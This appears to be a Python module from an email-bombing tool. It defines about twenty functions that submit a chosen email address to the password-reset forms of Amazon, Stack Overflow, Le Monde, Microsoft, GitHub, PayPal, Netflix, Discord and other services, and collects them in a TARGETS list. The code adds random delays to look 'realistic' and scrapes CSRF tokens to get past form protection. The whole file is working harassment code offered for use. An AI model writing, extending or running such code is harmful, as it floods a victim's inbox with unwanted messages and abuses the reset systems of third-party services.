"""Cibles focus — Amazon · Stack Overflow · Le Monde + viele mehr."""
import re
import time
import random

from http_util import post_form, scrape_form_post, post_json, csrf_form

# Verzögerung für realistischeres Verhalten
def delay():
    time.sleep(random.uniform(0.5, 1.5))

# ============== EXISTIERENDE TARGETS ==============

def amazon(session, email, stats):
    delay()
    url = (
        "https://www.amazon.fr/ap/forgotpassword?"
        "openid.pape.max_auth_age=0&openid.return_to=https%3A%2F%2Fwww.amazon.fr%2F"
        "&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select"
        "&openid.assoc_handle=frflex&openid.mode=checkid_setup&language=fr_FR"
    )
    return scrape_form_post(session, "Amazon", stats, url, email, ("ap_email",), url)

def stackoverflow(session, email, stats):
    delay()
    page = "https://stackoverflow.com/users/account-recovery"
    try:
        r = session.get(page, timeout=16)
        fkey = re.search(r'name="fkey"\s+value="([^"]+)"', r.text)
        data = {"email": email}
        if fkey:
            data["fkey"] = fkey.group(1)
        return post_form(session, "Stack Overflow", stats, page, data, referer=page)
    except Exception as e:
        stats.hit("Stack Overflow", False, str(e)[:40])
        return None

def lemonde(session, email, stats):
    delay()
    return post_form(
        session, "Le Monde", stats,
        "https://secure.lemonde.fr/sfuser/password/lost",
        {"email": email},
        referer="https://secure.lemonde.fr/sfuser/password/lost",
    )

# ============== NEUE TARGETS ==============

def microsoft(session, email, stats):
    delay()
    return post_form(session, "Microsoft", stats,
                     "https://account.live.com/password/reset",
                     {"Email": email, "SendEmail": "1"},
                     referer="https://account.live.com/password/reset")

def github(session, email, stats):
    delay()
    return post_form(session, "GitHub", stats,
                     "https://github.com/password_reset",
                     {"email": email},
                     referer="https://github.com/password_reset")

def reddit(session, email, stats):
    delay()
    return post_json(session, "Reddit", stats,
                     "https://www.reddit.com/api/v1/password-reset",
                     {"email": email})

def spotify(session, email, stats):
    delay()
    return post_form(session, "Spotify", stats,
                     "https://www.spotify.com/password-reset",
                     {"email": email},
                     referer="https://www.spotify.com/password-reset")

def twitter(session, email, stats):
    delay()
    return scrape_form_post(session, "Twitter", stats,
                            "https://twitter.com/account/begin_password_reset",
                            email, email_fields=("email",))

def instagram(session, email, stats):
    delay()
    return post_json(session, "Instagram", stats,
                     "https://www.instagram.com/api/v1/web/accounts/password_reset/",
                     {"email": email})

def linkedin(session, email, stats):
    delay()
    return post_form(session, "LinkedIn", stats,
                     "https://www.linkedin.com/uas/request-password-reset",
                     {"emailAddress": email},
                     referer="https://www.linkedin.com/uas/request-password-reset")

def adobe(session, email, stats):
    delay()
    return post_json(session, "Adobe", stats,
                     "https://auth.services.adobe.com/signup/v2/users/password/reset",
                     {"email": email})

def ebay(session, email, stats):
    delay()
    return post_form(session, "Ebay", stats,
                     "https://signin.ebay.com/ws/eBayISAPI.dll?SendPasswordReset",
                     {"email": email},
                     referer="https://signin.ebay.com/")

def paypal(session, email, stats):
    delay()
    return post_form(session, "PayPal", stats,
                     "https://www.paypal.com/authflow/password-reset",
                     {"email": email},
                     referer="https://www.paypal.com/")

def epicgames(session, email, stats):
    delay()
    return post_form(session, "EpicGames", stats,
                     "https://www.epicgames.com/account/password/reset",
                     {"email": email},
                     referer="https://www.epicgames.com/")

def netflix(session, email, stats):
    delay()
    return post_form(session, "Netflix", stats,
                     "https://www.netflix.com/LoginHelp",
                     {"email": email},
                     referer="https://www.netflix.com/")

def discord(session, email, stats):
    delay()
    return post_json(session, "Discord", stats,
                     "https://discord.com/api/v9/auth/forgot",
                     {"email": email})

def twitch(session, email, stats):
    delay()
    return post_form(session, "Twitch", stats,
                     "https://passport.twitch.tv/password_resets",
                     {"email": email},
                     referer="https://www.twitch.tv/")

def pinterest(session, email, stats):
    delay()
    return post_json(session, "Pinterest", stats,
                     "https://www.pinterest.com/resource/PasswordResetResource/create/",
                     {"email": email})

def tumblr(session, email, stats):
    delay()
    return post_form(session, "Tumblr", stats,
                     "https://www.tumblr.com/forgot_password",
                     {"email": email},
                     referer="https://www.tumblr.com/")

def wordpress(session, email, stats):
    delay()
    return post_form(session, "WordPress", stats,
                     "https://wordpress.com/wp-login.php?action=lostpassword",
                     {"user_login": email},
                     referer="https://wordpress.com/")

# ============== EXPORT ==============
TARGETS = [
    # Originale
    ("Amazon", amazon),
    ("Stack Overflow", stackoverflow),
    ("Le Monde", lemonde),
    # Neue
    ("Microsoft", microsoft),
    ("GitHub", github),
    ("Reddit", reddit),
    ("Spotify", spotify),
    ("Twitter", twitter),
    ("Instagram", instagram),
    ("LinkedIn", linkedin),
    ("Adobe", adobe),
    ("Ebay", ebay),
    ("PayPal", paypal),
    ("EpicGames", epicgames),
    ("Netflix", netflix),
    ("Discord", discord),
    ("Twitch", twitch),
    ("Pinterest", pinterest),
    ("Tumblr", tumblr),
    ("WordPress", wordpress),
]